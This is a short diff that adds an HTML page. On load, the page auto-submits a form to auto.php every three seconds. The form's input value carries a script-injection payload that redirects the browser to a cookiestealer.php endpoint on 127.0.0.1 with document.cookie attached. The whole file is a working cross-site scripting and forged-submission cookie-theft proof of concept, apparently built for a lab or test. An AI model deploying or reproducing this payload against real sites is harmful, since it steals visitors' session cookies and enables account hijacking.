@@ -1,0 +1,23 @@
+<form name="myForm" id="myForm" target="_myFrame" action="auto.php" method="POST">
+    <p>
+        <input name="test" value="Test value><script>document.location='http://127.0.0.1/cookiestealer.php?c='+document.cookie</script>" />
+    </p>
+    <p>
+        <input type="submit" value="Submit" />
+    </p>
+</form>
+
+<script type="text/javascript">
+    window.onload=function(){
+        var auto = setTimeout(function(){ autoRefresh(); }, 100);
+
+        function submitform(){
+          document.forms["myForm"].submit();
+        }
+
+        function autoRefresh(){
+           clearTimeout(auto);
+           auto = setTimeout(function(){ submitform(); autoRefresh(); }, 3000);
+        }
+    }
+</script>
